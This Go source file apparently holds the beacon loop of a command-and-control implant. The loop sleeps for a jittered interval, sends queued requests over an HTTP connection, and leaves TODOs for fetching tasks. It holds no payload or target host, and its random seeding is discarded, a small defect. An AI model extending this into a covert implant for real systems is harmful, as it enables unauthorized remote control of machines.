package internal

import (
	"math/rand"
	"time"
)

type Beacon struct {
	Sleep    int
	Jitter   int
	HttpConn *HttpConn
	ReqQueue *SafeRequestQueue
	//Cqueue // We will come back to this later
}

func NewBeacon() *Beacon {
	return &Beacon{}
}

// Beacon.Start
//
// Init beacon goroutine
func (b *Beacon) Start() {
	// Init new RNG source
	rand.NewSource(time.Now().Unix())

	// Begin beacon routine
	go func() {
		for {
			// Calculate sleep time
			time.Sleep((time.Duration(b.Sleep) + time.Duration(rand.Intn(b.Jitter))) * time.Second)

			// Check for next request, ensure it's not nil
			if nextReq := b.ReqQueue.GetNext(); nextReq != nil {
				// Send request
				b.HttpConn.SendRequest(nextReq)
				// Shift queue up
				b.ReqQueue.ShiftUp()
				// TODO: Send get tasks request
				continue
			} else {
				// TODO: Send get tasks request
				continue
			}
		}
	}()
}
